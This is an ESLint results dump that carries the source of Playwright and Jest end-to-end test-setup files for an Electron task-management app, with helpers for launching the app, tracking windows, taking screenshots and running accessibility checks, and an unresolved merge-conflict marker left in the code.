Determine the main file path\n  const mainPath = process.env.ELECTRON_MAIN_PATH || join(process.cwd(), 'dist', 'electron', 'main.cjs');\n  \n  try {\n    // Launch Electron with optimized configuration\n    globalElectronApp = await electron.launch({\n      args: [mainPath],\n      env: {\n        ...defaultEnv,\n        ...options.env\n      },\n      timeout: options.timeout || 30000,\n      // Enable logging for debugging\n      // Enable logging for debugging\n      // (logger option removed in newer Playwright - use ELECTRON_ENABLE_LOGGING=1 env var instead)\n    });\n\n    // 2025 Best Practice: Set up window event tracking\n    globalElectronApp.on('window', async (window) => {\n      windowCounter++;\n      const windowId = `window-${windowCounter}`;\n      \n      try {\n        // Wait for window to be ready\n        await window.waitForLoadState('domcontentloaded', { timeout: 5000 }).catch(() => {});\n        \n        const title = await window.title();\n        const url = await window.url();\n        \n        console.log(`ðŸ“± New window opened [${windowId}]: title=\"${title}\", url=\"${url}\"`);\n        windowTracker.set(windowId, window);\n        \n        // Attach console logging for debugging\n        if (process.env.PLAYWRIGHT_DEBUG) {\n          window.on('console', (msg) => {\n            console.log(`[${windowId} CONSOLE]:`, msg.text());\n          });\n        }\n      } catch (err) {\n        console.log(`âš ï¸  Error tracking window [${windowId}]:`, err);\n      }\n    });\n\n    const launchTime = Date.now() - startTime;\n    console.log(`âœ… Electron app launched successfully in ${launchTime}ms`);\n\n    return globalElectronApp;\n  } catch (error) {\n    console.error('âŒ Failed to launch Electron app:', error);\n    throw error;\n  }\n}\n\n/**\n * Get the main window and configure it for testing\n * Implements 2025 best practices for window management\n */\nexport async function getMainWindow(): Promise<Page> {\n  if (!globalElectronApp) {\n    throw new Error('Electron app must be launched before getting main window');\n  }\n\n  console.log('ðŸªŸ Getting main window for testing...');\n\n  try {\n    // 2025 Best Practice: Handle multiple windows including DevTools\n    // Wait for window with timeout\n    const timeout = 30000; // 30 seconds\n    const startTime = Date.now();\n    \n    while (Date.now() - startTime < timeout) {\n      const windows = globalElectronApp.windows();\n      console.log(`  Found ${windows.length} window(s)`);\n      \n      // Look for the main application window (not DevTools)\n      for (const window of windows) {\n        try {\n          const title = await window.title();\n          const url = await window.url();\n          console.log(`  Checking window: title=\"${title}\", url=\"${url}\"`);\n          \n          // Skip DevTools windows\n          if (title.toLowerCase().includes('devtools') || \n              url.includes('devtools://')) {\n            console.log('  â†³ Skipping DevTools window');\n            continue;\n          }\n          \n          // Found main window\n          console.log('  â†³ Found main application window!');\n          globalMainPage = window;\n          break;\n        } catch (err) {\n          // Window might be closed or not ready\n          console.log('  â†³ Error checking window:', err);\n        }\n      }\n      \n      if (globalMainPage) {\n        break;\n      }\n      \n      // If no windows yet or only DevTools, wait a bit\n      if (windows.length === 0 || !globalMainPage) {\n        console.log('  Waiting for main window...');\n        await new Promise(resolve => setTimeout(resolve, 500));\n      }\n    }\n    \n    // Fallback: try firstWindow if no main window found\n    if (!globalMainPage) {\n      console.log('âš ï¸  No main window found, trying firstWindow()...');\n      globalMainPage = await globalElectronApp.firstWindow();\n    }\n    \n    // Configure page for testing\n    await configurePageForTesting(globalMainPage);\n    \n    console.log('âœ… Main window configured and ready for testing');\n    return globalMainPage;\n  } catch (error) {\n    console.error('âŒ Failed to get main window:', error);\n    throw error;\n  }\n}\n\n/**\n * Configure page with testing optimizations\n */\nasync function configurePageForTesting(page: Page): Promise<void> {\n  // Set viewport to standard testing size\n  await page.setViewportSize({ width: 1280, height: 720 });\n  \n  // Set up console logging for debugging\n  if (process.env.PLAYWRIGHT_DEBUG) {\n    page.on('console', (msg) => {\n      console.log(`[BROWSER CONSOLE ${msg.type()}]:`, msg.text());\n    });\n    \n    page.on('pageerror', (error) => {\n      console.error('[BROWSER ERROR]:', error.message);\n    });\n  }\n\n  // Wait for the page to be ready\n  await page.waitForLoadState('domcontentloaded');\n  await page.waitForTimeout(1000); // Allow for initial animations\n}\n\n/**\n * Close Electron application and cleanup resources\n */\nexport async function closeElectronE2E(): Promise<void> {\n  if (!globalElectronApp) {\n    console.log('âš ï¸ No Electron app to close');\n    return;\n  }\n\n  console.log('ðŸ§¹ Closing Electron app and cleaning up...');\n  \n  try {\n    await globalElectronApp.close();\n    globalElectronApp = null;\n    globalMainPage = null;\n    \n    // Clear window tracker\n    windowTracker.clear();\n    windowCounter = 0;\n    \n    console.log('âœ… Electron app closed successfully');\n  } catch (error) {\n    console.error('âŒ Error closing Electron app:', error);\n  }\n}\n\n/**\n * Wait for a window with a specific title\n * 2025 Best Practice: Robust window detection with timeout\n */\nexport async function waitForWindowWithTitle(\n  title: string | RegExp,\n  options: { timeout?: number; exact?: boolean } = {}\n): Promise<Page | null> {\n  if (!globalElectronApp) {\n    throw new Error('Electron app must be launched before waiting for windows');\n  }\n  \n  const timeout = options.timeout || 30000;\n  const exact = options.exact ?? false;\n  const startTime = Date.now();\n  \n  console.log(`ðŸ” Waiting for window with title: ${title}`);\n  \n  while (Date.now() - startTime < timeout) {\n    const windows = globalElectronApp.windows();\n    \n    for (const window of windows) {\n      try {\n        const windowTitle = await window.title();\n        \n        const matches = title instanceof RegExp \n          ? title.test(windowTitle)\n          : exact \n            ? windowTitle === title\n            : windowTitle.includes(title);\n            \n        if (matches) {\n          console.log(`âœ… Found window with title: \"${windowTitle}\"`);\n          return window;\n        }\n      } catch (err) {\n        // Window might be closed or not ready\n      }\n    }\n    \n    await new Promise(resolve => setTimeout(resolve, 500));\n  }\n  \n  console.log(`âš ï¸ Timeout waiting for window with title: ${title}`);\n  return null;\n}\n\n/**\n * Get all tracked windows for debugging\n * 2025 Best Practice: Window introspection for debugging\n */\nexport async function getTrackedWindows(): Promise<Array<{ id: string; title: string; url: string }>> {\n  const windows: Array<{ id: string; title: string; url: string }> = [];\n  \n  for (const [id, window] of windowTracker.entries()) {\n    try {\n      const title = await window.title().catch(() => 'Unknown');\n      const url = await window.url().catch(() => 'Unknown');\n      windows.push({ id, title, url });\n    } catch (err) {\n      // Window might be closed\n    }\n  }\n  \n  return windows;\n}\n\n/**\n * Debug helper: Log all current windows\n */\nexport async function logAllWindows(): Promise<void> {\n  if (!globalElectronApp) {\n    console.log('âš ï¸ No Electron app running');\n    return;\n  }\n  \n  const windows = globalElectronApp.windows();\n  console.log(`\\nðŸ“± Current Windows (${windows.length} total):`);\n  \n  for (let i = 0; i < windows.length; i++) {\n    try {\n      const title = await windows[i].title().catch(() => 'Unknown');\n      const url = await windows[i].url().catch(() => 'Unknown');\n      console.log(`  ${i + 1}. title=\"${title}\", url=\"${url}\"`);\n    } catch (err) {\n      console.log(`  ${i + 1}. [Error reading window info]`);\n    }\n  }\n  console.log('');\n}\n\n/**\n * Take a screenshot with consistent naming and storage\n * Following 2025 best practices for visual testing\n */\nexport async function takeE2EScreenshot(name: string, options?: { fullPage?: boolean }): Promise<void> {\n  if (!globalMainPage) {\n    console.warn('âš ï¸ No page available for screenshot');\n    return;\n  }\n\n  try {\n    const screenshotPath = join('test-results', 'screenshots', `${name}-${Date.now()}.png`);\n    \n    await globalMainPage.screenshot({\n      path: screenshotPath,\n      fullPage: options?.fullPage ?? true,\n      animations: 'disabled'\n    });\n\n    console.log(`ðŸ“¸ Screenshot saved: ${screenshotPath}`);\n  } catch (error) {\n    console.error('âŒ Failed to take screenshot:', error);\n  }\n}\n\n/**\n * Simulate user actions with realistic timing\n * Following 2025 UX testing best practices\n */\nexport async function simulateUserActions(page: Page, actions: Array<{\n  type: 'click' | 'type' | 'wait' | 'hover' | 'scroll';\n  selector?: string;\n  text?: string;\n  delay?: number;\n}>): Promise<void> {\n  for (const action of actions) {\n    switch (action.type) {\n      case 'click':\n        if (action.selector) {\n          await page.click(action.selector);\n          await page.waitForTimeout(action.delay || 200);\n        }\n        break;\n      case 'type':\n        if (action.selector && action.text) {\n          await page.fill(action.selector, action.text);\n          await page.waitForTimeout(action.delay || 100);\n        }\n        break;\n      case 'hover':\n        if (action.selector) {\n          await page.hover(action.selector);\n          await page.waitForTimeout(action.delay || 100);\n        }\n        break;\n      case 'wait':\n        await page.waitForTimeout(action.delay || 1000);\n        break;\n      case 'scroll':\n        await page.evaluate(() => window.scrollBy(0, 100));\n        await page.waitForTimeout(action.delay || 100);\n        break;\n    }\n  }\n}\n\n/**\n * Measure performance metrics\n * Following 2025 performance testing standards\n */\nexport async function measureE2EPerformance(): Promise<PerformanceMetrics> {\n  const metrics: PerformanceMetrics = {\n    timestamp: Date.now()\n  };\n\n  try {\n    if (globalElectronApp) {\n      // Measure memory usage\n      const mainProcess = globalElectronApp.process();\n      if (mainProcess) {\n        metrics.memoryUsage = process.memoryUsage();\n        metrics.cpuUsage = process.cpuUsage();\n      }\n    }\n\n    if (globalMainPage) {\n      // Measure page performance\n      const performanceMetrics = await globalMainPage.evaluate(() => {\n        return {\n          timing: performance.timing,\n          navigation: performance.navigation,\n          memory: (performance as any).memory\n        };\n      });\n\n      // Calculate startup time if available\n      if (performanceMetrics.timing) {\n        metrics.startupTime = performanceMetrics.timing.loadEventEnd - performanceMetrics.timing.navigationStart;\n      }\n    }\n  } catch (error) {\n    console.warn('âš ï¸ Could not measure performance:', error);\n  }\n\n  return metrics;\n}\n\n/**\n * Wait for specific condition with timeout\n * Implementing 2025 async testing patterns\n */\nexport async function waitForE2ECondition(\n  condition: () => Promise<boolean>,\n  options: { timeout?: number; interval?: number; description?: string } = {}\n): Promise<void> {\n  const timeout = options.timeout || 15000;\n  const interval = options.interval || 500;\n  const description = options.description || 'condition';\n  \n  const startTime = Date.now();\n  \n  while (Date.now() - startTime < timeout) {\n    try {\n      if (await condition()) {\n        console.log(`âœ… Condition met: ${description}`);\n        return;\n      }\n    } catch (error) {\n      // Continue waiting\n    }\n    \n    await new Promise(resolve => setTimeout(resolve, interval));\n  }\n  \n  throw new Error(`âŒ Timeout waiting for ${description} (${timeout}ms)`);\n}\n\n/**\n * Validate accessibility following 2025 a11y standards\n */\nexport async function validateAccessibility(page: Page): Promise<void> {\n  try {\n    // Check for basic accessibility requirements\n    const accessibilityIssues = await page.evaluate(() => {\n      const issues: string[] = [];\n      \n      // Check for alt text on images\n      const images = document.querySelectorAll('img');\n      images.forEach((img, index) => {\n        if (!img.alt && !img.getAttribute('aria-label')) {\n          issues.push(`Image ${index + 1} missing alt text`);\n        }\n      });\n      \n      // Check for form labels\n      const inputs = document.querySelectorAll('input, textarea, select');\n      inputs.forEach((input, index) => {\n        const id = input.id;\n        const hasLabel = id && document.querySelector(`label[for=\"${id}\"]`);\n        const hasAriaLabel = input.getAttribute('aria-label');\n        \n        if (!hasLabel && !hasAriaLabel) {\n          issues.push(`Form element ${index + 1} missing label`);\n        }\n      });\n      \n      // Check for heading structure\n      const headings = document.querySelectorAll('h1, h2, h3, h4, h5, h6');\n      if (headings.length === 0) {\n        issues.push('No heading elements found');\n      }\n      \n      return issues;\n    });\n    \n    if (accessibilityIssues.length > 0) {\n      console.warn('âš ï¸ Accessibility issues found:', accessibilityIssues);\n    } else {\n      console.log('âœ… Basic accessibility validation passed');\n    }\n  } catch (error) {\n    console.warn('âš ï¸ Accessibility validation failed:', error);\n  }\n}\n\n/**\n * Navigate to a specific view using the sidebar\n * Implements view switching test patterns\n */\nexport async function navigateToView(page: Page, viewType: 'list' | 'kanban' | 'calendar' | 'timeline' | 'analytics' | 'claude-config'): Promise<void> {\n  console.log(`ðŸ§­ Navigating to ${viewType} view...`);\n  \n  // Mapping of view types to possible selectors\n  const viewSelectors: Record<string, string[]> = {\n    list: [\n      '[data-testid=\"tasks-nav\"]',\n      'button:has-text(\"All Tasks\")',\n      'nav button:has-text(\"Tasks\")',\n      '[aria-label*=\"tasks\"]'\n    ],\n    kanban: [\n      '[data-testid=\"kanban-nav\"]',\n      'button:has-text(\"Kanban\")',\n      'nav button:has-text(\"Board\")',\n      '[aria-label*=\"kanban\"]'\n    ],\n    calendar: [\n      '[data-testid=\"calendar-nav\"]',\n      'button:has-text(\"Calendar\")',\n      '[aria-label*=\"calendar\"]'\n    ],\n    timeline: [\n      '[data-testid=\"timeline-nav\"]',\n      'button:has-text(\"Timeline\")',\n      '[aria-label*=\"timeline\"]'\n    ],\n    analytics: [\n      '[data-testid=\"analytics-nav\"]',\n      'button:has-text(\"Overview\")',\n      'button:has-text(\"Analytics\")',\n      '[aria-label*=\"overview\"]'\n    ],\n    'claude-config': [\n      '[data-testid=\"claude-config-nav\"]',\n      'button:has-text(\"Claude Config\")',\n      'button:has-text(\"Settings\")',\n      '[aria-label*=\"config\"]'\n    ]\n  };\n  \n  const selectors = viewSelectors[viewType] || [];\n  \n  for (const selector of selectors) {\n    try {\n      const element = page.locator(selector).first();\n      if (await element.isVisible({ timeout: 2000 })) {\n        await element.click();\n        await page.waitForTimeout(500); // Allow for view transition\n        console.log(`âœ… Successfully navigated to ${viewType} view`);\n        return;\n      }\n    } catch (error) {\n      // Continue to next selector\n    }\n  }\n  \n  // Fallback: try keyboard shortcuts\n  const shortcuts: Record<string, string> = {\n    analytics: 'Meta+1',\n    list: 'Meta+2',\n    calendar: 'Meta+3',\n    kanban: 'Meta+4',\n    timeline: 'Meta+5',\n    'claude-config': 'Meta+6'\n  };\n  \n  if (shortcuts[viewType]) {\n    console.log(`ðŸŽ¹ Using keyboard shortcut for ${viewType} view`);\n    await page.keyboard.press(shortcuts[viewType]);\n    await page.waitForTimeout(500);\n  } else {\n    throw new Error(`âŒ Could not navigate to ${viewType} view`);\n  }\n}\n\n/**\n * Verify that a specific view is currently active\n */\nexport async function verifyActiveView(page: Page, expectedView: string): Promise<boolean> {\n  try {\n    // Check for view-specific elements or indicators\n    const viewIndicators = [\n      `[data-view=\"${expectedView}\"]`,\n      `[data-testid=\"${expectedView}-view\"]`,\n      `.${expectedView}-view`,\n      `[aria-label*=\"${expectedView}\"]`\n    ];\n    \n    for (const selector of viewIndicators) {\n      const element = page.locator(selector).first();\n      if (await element.isVisible({ timeout: 2000 })) {\n        return true;\n      }\n    }\n    \n    // Check if the URL or state indicates the current view\n    const currentView = await page.evaluate(() => {\n      // Try to get view state from various possible sources\n      return (window as any).__CURRENT_VIEW__ || \n             document.body.getAttribute('data-view') ||\n             document.documentElement.getAttribute('data-view');\n    });\n    \n    return currentView === expectedView;\n  } catch (error) {\n    console.warn(`âš ï¸ Could not verify ${expectedView} view:`, error);\n    return false;\n  }\n}\n\n/**\n * Get current view information for debugging\n */\nexport async function getCurrentViewInfo(page: Page): Promise<{ view?: string; elements: string[] }> {\n  try {\n    const info = await page.evaluate(() => {\n      const elements: string[] = [];\n      \n      // Look for view indicators\n      const possibleViewElements = document.querySelectorAll('[data-view], [data-testid*=\"view\"], [class*=\"view\"]');\n      possibleViewElements.forEach(el => {\n        elements.push(el.tagName + (el.className ? `.${el.className}` : '') + (el.id ? `#${el.id}` : ''));\n      });\n      \n      // Try to determine current view\n      const view = (window as any).__CURRENT_VIEW__ || \n                   document.body.getAttribute('data-view') ||\n                   document.documentElement.getAttribute('data-view');\n      \n      return { view, elements };\n    });\n    \n    return info;\n  } catch (error) {\n    console.warn('âš ï¸ Could not get current view info:', error);\n    return { elements: [] };\n  }\n}\n\n/**\n * Global setup function for test suites\n * This is the main function exported for Playwright's globalSetup\n */\nasync function globalSetup(config?: FullConfig): Promise<void> {\n  console.log('ðŸ”§ Running global E2E setup...');\n  \n  // Ensure test directories exist\n  const testDirs = [\n    'test-results',\n    'test-results/screenshots',\n    'test-results/videos',\n    'test-results/traces'\n  ];\n  \n  for (const dir of testDirs) {\n    const fullPath = pathJoin(process.cwd(), dir);\n    if (!existsSync(fullPath)) {\n      mkdirSync(fullPath, { recursive: true });\n      console.log(`ðŸ“ Created directory: ${dir}`);\n    }\n  }\n  \n  console.log('âœ… Global setup complete');\n}\n\n// Export as default for Playwright globalSetup\nexport default globalSetup;\n\nimport { vi, beforeEach, afterEach, beforeAll, afterAll } from 'vitest'\nimport { type ElectronApplication, type Page, _electron as electron } from 'playwright'\nimport { join, resolve } from 'path'\nimport { mkdir, writeFile, readFile, unlink } from 'fs/promises'\nimport { existsSync } from 'fs'\n\n// E2E test configuration following 2025 best practices\nconst E2E_CONFIG = {\n  APP_TIMEOUT: 45000, // Extended timeout for E2E app startup\n  PAGE_TIMEOUT: 30000, // Page operation timeout\n  SCREENSHOT_ON_FAILURE: true,\n  RECORD_VIDEO: process.env.CI === 'true', // Record videos in CI\n  HEADLESS: process.env.CI === 'true', // Headless in CI, headed locally\n  SLOW_MO: process.env.CI ? 0 : 100, // Slow down for local debugging\n  PARALLEL_WORKERS: process.env.CI ? 2 : 1 // Parallel execution in CI\n}\n\ninterface E2ETestContext {\n  electronApp?: ElectronApplication\n  page?: Page\n  testDataDir: string\n  screenshotsDir: string\n  videosDir: string\n  tempFiles: string[]\n  testStartTime: number\n  performanceMetrics: {\n    startupTime?: number\n    memoryUsage?: NodeJS.MemoryUsage\n    renderTime?: number\n  }\n}\n\nconst e2eContext: E2ETestContext = {\n  testDataDir: join(__dirname, '../fixtures/e2e-data'),\n  screenshotsDir: join(__dirname, '../screenshots'),\n  videosDir: join(__dirname, '../videos'),\n  tempFiles: [],\n  testStartTime: 0,\n  performanceMetrics: {}\n}\n\n// Utility functions for E2E testing\nexport const launchElectronForE2E = async (options: {\n  args?: string[]\n  env?: Record<string, string>\n  recordVideo?: boolean\n  slowMo?: number\n} = {}): Promise<ElectronApplication> => {\n  const {\n    args = [],\n    env = {},\n    recordVideo = E2E_CONFIG.RECORD_VIDEO,\n    slowMo = E2E_CONFIG.SLOW_MO\n  } = options\n\n  console.log('ðŸš€ Launching Electron app for E2E testing...')\n  const startTime = Date.now()\n\n  const appPath = join(__dirname, '../../dist/main/index.js')\n  \n  if (!existsSync(appPath)) {\n    throw new Error(`Electron app not found at ${appPath}. Please build the app first.`)\n  }\n\n  const launchOptions: any = {\n    args: [appPath, ...args],\n    timeout: E2E_CONFIG.APP_TIMEOUT,\n    env: {\n      NODE_ENV: 'test',\n      ELECTRON_IS_DEV: '0',\n      ...env\n    }\n  }\n\n  if (recordVideo) {\n    launchOptions.recordVideo = {\n      dir: e2eContext.videosDir,\n      size: { width: 1280, height: 720 }\n    }\n  }\n\n  if (slowMo > 0) {\n    launchOptions.slowMo = slowMo\n  }\n\n  try {\n    const electronApp = await electron.launch(launchOptions)\n    \n    // Wait for app to be ready and measure startup time\n    await electronApp.evaluate(async ({ app }) => {\n      await app.whenReady()\n    })\n    \n    const startupTime = Date.now() - startTime\n    e2eContext.performanceMetrics.startupTime = startupTime\n    \n    e2eContext.electronApp = electronApp\n    \n    console.log(`âœ… Electron app launched successfully in ${startupTime}ms`)\n    return electronApp\n  } catch (error) {\n    console.error('âŒ Failed to launch Electron app:', error)\n    throw error\n  }\n}\n\nexport const getMainWindow = async (): Promise<Page> => {\n  if (!e2eContext.electronApp) {\n    throw new Error('Electron app not launched. Call launchElectronForE2E() first.')\n  }\n\n  console.log('ðŸ” Getting main window...')\n  const renderStartTime = Date.now()\n  \n  const page = await e2eContext.electronApp.firstWindow()\n  e2eContext.page = page\n  \n  // Configure page for E2E testing\n  await page.setViewportSize({ width: 1280, height: 720 })\n  \n  // Wait for app to be fully loaded\n  await page.waitForLoadState('domcontentloaded', { timeout: E2E_CONFIG.PAGE_TIMEOUT })\n  await page.waitForLoadState('networkidle', { timeout: E2E_CONFIG.PAGE_TIMEOUT })\n  \n  // Wait for React app to hydrate\n  await page.waitForSelector('[data-testid=\"app-root\"], #root', { \n    timeout: 15000,\n    state: 'visible'\n  })\n  \n  const renderTime = Date.now() - renderStartTime\n  e2eContext.performanceMetrics.renderTime = renderTime\n  \n  // Set up error and console logging\n  page.on('pageerror', (error) => {\n    console.error('ðŸ’¥ Page error during E2E test:', error.message)\n  })\n  \n  page.on('console', (msg) => {\n    const type = msg.type()\n    if (type === 'error') {\n      console.error('ðŸ”´ Console error:', msg.text())\n    } else if (type === 'warning') {\n      console.warn('ðŸŸ¡ Console warning:', msg.text())\n    }\n  })\n  \n  // Set up request/response monitoring\n  page.on('request', (request) => {\n    if (request.url().includes('file://') && !request.url().includes('index.html')) {\n      console.debug('ðŸ“¤ File request:', request.url())\n    }\n  })\n  \n  page.on('response', (response) => {\n    if (!response.ok() && response.url().includes('file://')) {\n      console.warn('ðŸŸ¡ Failed file response:', response.url(), response.status())\n    }\n  })\n  \n  console.log(`âœ… Main window ready in ${renderTime}ms`)\n  return page\n}\n\nexport const closeElectronE2E = async (): Promise<void> => {\n  if (e2eContext.electronApp) {\n    console.log('ðŸ”„ Closing Electron app...')\n    \n    try {\n      // Take final screenshot if requested\n      if (e2eContext.page && E2E_CONFIG.SCREENSHOT_ON_FAILURE) {\n        await takeE2EScreenshot('final-state')\n      }\n      \n      // Measure memory usage before closing\n      const memoryUsage = await e2eContext.electronApp.evaluate(() => {\n        return process.memoryUsage()\n      })\n      e2eContext.performanceMetrics.memoryUsage = memoryUsage\n      \n      // Close all windows gracefully\n      const windows = e2eContext.electronApp.windows()\n      await Promise.all(windows.map(window => \n        window.close().catch(() => {})\n      ))\n      \n      // Close the app\n      await e2eContext.electronApp.close()\n      \n      console.log('âœ… Electron app closed successfully')\n    } catch (error) {\n      console.error('âŒ Error closing Electron app:', error)\n    } finally {\n      e2eContext.electronApp = undefined\n      e2eContext.page = undefined\n    }\n  }\n}\n\nexport const takeE2EScreenshot = async (\n  name: string,\n  options: {\n    fullPage?: boolean\n    path?: string\n    clip?: { x: number; y: number; width: number; height: number }\n  } = {}\n): Promise<Buffer | null> => {\n  if (!e2eContext.page) {\n    console.warn('âš ï¸ No page available for screenshot')\n    return null\n  }\n\n  try {\n    const timestamp = new Date().toISOString().replace(/[:.]/g, '-')\n    const filename = `${name}-${timestamp}.png`\n    const screenshotPath = options.path || join(e2eContext.screenshotsDir, filename)\n    \n    const screenshot = await e2eContext.page.screenshot({\n      path: screenshotPath,\n      fullPage: options.fullPage ?? true,\n      clip: options.clip\n    })\n    \n    console.log(`ðŸ“¸ Screenshot saved: ${screenshotPath}`)\n    return screenshot\n  } catch (error) {\n    console.error('âŒ Failed to take screenshot:', error)\n    return null\n  }\n}\n\nexport const createTestTasksFile = async (tasks: any[]): Promise<string> => {\n  const fileName = `test-tasks-${Date.now()}.json`\n  const filePath = join(e2eContext.testDataDir, fileName)\n  \n  await writeFile(filePath, JSON.stringify({ tasks }, null, 2), 'utf-8')\n  e2eContext.tempFiles.push(filePath)\n  \n  console.log(`ðŸ“„ Created test tasks file: ${filePath}`)\n  return filePath\n}\n\nexport const simulateUserActions = {\n  async clickAndWait(page: Page, selector: string, waitFor?: string): Promise<void> {\n    await page.click(selector)\n    if (waitFor) {\n      await page.waitForSelector(waitFor, { timeout: 10000 })\n    }\n    // Add small delay for UI animations\n    await page.waitForTimeout(300)\n  },\n\n  async typeAndWait(page: Page, selector: string, text: string): Promise<void> {\n    await page.fill(selector, text)\n    await page.press(selector, 'Tab') // Trigger blur/change events\n    await page.waitForTimeout(300)\n  },\n\n  async dragAndDrop(page: Page, sourceSelector: string, targetSelector: string): Promise<void> {\n    const source = await page.locator(sourceSelector)\n    const target = await page.locator(targetSelector)\n    await source.dragTo(target)\n    await page.waitForTimeout(500) // Wait for drag animation\n  },\n\n  async selectFromDropdown(page: Page, dropdownSelector: string, optionText: string): Promise<void> {\n    await page.click(dropdownSelector)\n    await page.click(`text=${optionText}`)\n    await page.waitForTimeout(200)\n  },\n\n  async uploadFile(page: Page, inputSelector: string, filePath: string): Promise<void> {\n    const fileInput = await page.locator(inputSelector)\n    await fileInput.setInputFiles(filePath)\n    await page.waitForTimeout(500)\n  }\n}\n\nexport const waitForE2ECondition = async (\n  condition: () => Promise<boolean>,\n  timeout: number = 10000,\n  interval: number = 500\n): Promise<void> => {\n  const startTime = Date.now()\n  \n  while (Date.now() - startTime < timeout) {\n    if (await condition()) {\n      return\n    }\n    await new Promise(resolve => setTimeout(resolve, interval))\n  }\n  \n  throw new Error(`Condition not met within ${timeout}ms`)\n}\n\nexport const measureE2EPerformance = async (): Promise<typeof e2eContext.performanceMetrics> => {\n  if (e2eContext.electronApp) {\n    try {\n      const memory = await e2eContext.electronApp.evaluate(() => {\n        return process.memoryUsage()\n      })\n      e2eContext.performanceMetrics.memoryUsage = memory\n    } catch (error) {\n      console.warn('âš ï¸ Could not measure memory usage:', error)\n    }\n  }\n  \n  return { ...e2eContext.performanceMetrics }\n}\n\nexport const validateAccessibility = async (page: Page): Promise<{\n  violations: any[]\n  passes: any[]\n}> => {\n  // Inject axe-core for accessibility testing\n  await page.addScriptTag({\n    url: 'https://cdn.jsdelivr.net/npm/axe-core@4.7.0/axe.min.js'\n  })\n  \n  const results = await page.evaluate(() => {\n    return (window as any).axe.run()\n  })\n  \n  if (results.violations.length > 0) {\n    console.warn(`âš ï¸ ${results.violations.length} accessibility violations found`)\n    results.violations.forEach((violation: any) => {\n      console.warn(`- ${violation.id}: ${violation.description}`)\n    })\n  }\n  \n  return {\n    violations: results.violations,\n    passes: results.passes\n  }\n}\n\n// Cleanup utilities\nconst cleanupTempFiles = async (): Promise<void> => {\n  for (const filePath of e2eContext.tempFiles) {\n    try {\n      await unlink(filePath)\n    } catch (error) {\n      // File might already be deleted\n    }\n  }\n  e2eContext.tempFiles = []\n}\n\n// Global E2E test setup\nbeforeAll(async () => {\n  console.log('ðŸ”§ Setting up E2E test environment...')\n  \n  // Create necessary directories\n  for (const dir of [e2eContext.testDataDir, e2eContext.screenshotsDir, e2eContext.videosDir]) {\n    try {\n      await mkdir(dir, { recursive: true })\n    } catch (error) {\n      // Directory might already exist\n    }\n  }\n  \n  console.log('âœ… E2E test environment ready')\n}, 60000)\n\nbeforeEach(async () => {\n  e2eContext.testStartTime = Date.now()\n  e2eContext.performanceMetrics = {}\n  \n  // Set longer timeout for E2E tests\n  vi.setConfig({ testTimeout: E2E_CONFIG.APP_TIMEOUT })\n})\n\nafterEach(async () => {\n  const testDuration = Date.now() - e2eContext.testStartTime\n  \n  // Take screenshot on failure if page is available\n  if (E2E_CONFIG.SCREENSHOT_ON_FAILURE && e2eContext.page) {\n    const testName = expect.getState().currentTestName || 'unknown-test'\n    await takeE2EScreenshot(`failure-${testName.replace(/[^a-zA-Z0-9]/g, '-')}`)\n  }\n  \n  // Log performance metrics\n  const metrics = await measureE2EPerformance()\n  if (Object.keys(metrics).length > 0) {\n    console.log('ðŸ“Š Performance metrics:', {\n      testDuration: `${testDuration}ms`,\n      ...metrics\n    })\n  }\n  \n  // Warn about slow tests\n  if (testDuration > E2E_CONFIG.APP_TIMEOUT * 0.8) {\n    console.warn(`ðŸŒ Slow E2E test: ${testDuration}ms`)\n  }\n  \n  // Clean up app and temp files\n  await closeElectronE2E()\n  await cleanupTempFiles()\n})\n\nafterAll(async () => {\n  console.log('ðŸ§¹ Cleaning up E2E test environment...')\n  \n  // Final cleanup\n  await closeElectronE2E()\n  await cleanupTempFiles()\n  \n  console.log('âœ… E2E test cleanup complete')\n}, 30000)\n\n// Export context and configuration for advanced test scenarios\nexport { e2eContext, E2E_CONFIG }\n\n// Type declarations for E2E testing\ndeclare global {\n  interface Window {\n    axe: {\n      run: () => Promise<{\n        violations: any[]\n        passes: any[]\n      }>\n    }\n  }\n}\n>>>>>>> Stashed changes\n","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/integration-tests.setup.ts","messages":[{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":278,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":293,"endColumn":4},{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":295,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":295,"endColumn":48},{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":296,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":296,"endColumn":36},{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":298,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":303,"endColumn":4}],"suppressedMessages":[],"errorCount":4,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Integration Tests Setup Configuration (2025)\n * \n * Global setup for integration tests with enhanced async handling,\n * real service mocking, and comprehensive error tracking.\n */\n\nimport { jest } from '@jest/globals'\nimport * as fs from 'fs/promises'\nimport * as path from 'path'\n\n// Extended timeout for integration tests\njest.setTimeout(60000)\n\n// Test environment setup\nbeforeAll(async () => {\n  console.log('ðŸ”§ Setting up integration test environment...')\n  \n  // Create test directories\n  const testDirs = [\n    'test-results/integration',\n    'test-results/integration/coverage',\n    'test-results/integration/artifacts'\n  ]\n  \n  for (const dir of testDirs) {\n    await fs.mkdir(dir, { recursive: true })\n  }\n  \n  // Set environment variables\n  process.env.NODE_ENV = 'test'\n  process.env.TEST_TYPE = 'integration'\n  process.env.LOG_LEVEL = 'error' // Reduce noise in tests\n  \n  console.log('âœ… Integration test environment ready')\n})\n\n// Cleanup after all tests\nafterAll(async () => {\n  console.log('ðŸ§¹ Cleaning up integration test environment...')\n  \n  // Force garbage collection if available\n  if (global.gc) {\n    global.gc()\n  }\n  \n  // Close any open handles\n  await new Promise(resolve => setTimeout(resolve, 1000))\n})\n\n// Enhanced error tracking for integration tests\nconst integrationErrors: Array<{\n  test: string\n  error: Error\n  timestamp: number\n  context: any\n}> = []\n\nbeforeEach(() => {\n  const currentTest = expect.getState().currentTestName || 'unknown'\n  \n  // Track unhandled errors\n  process.removeAllListeners('unhandledRejection')\n  process.removeAllListeners('uncaughtException')\n  \n  process.on('unhandledRejection', (reason, promise) => {\n    integrationErrors.push({\n      test: currentTest,\n      error: reason instanceof Error ? reason : new Error(String(reason)),\n   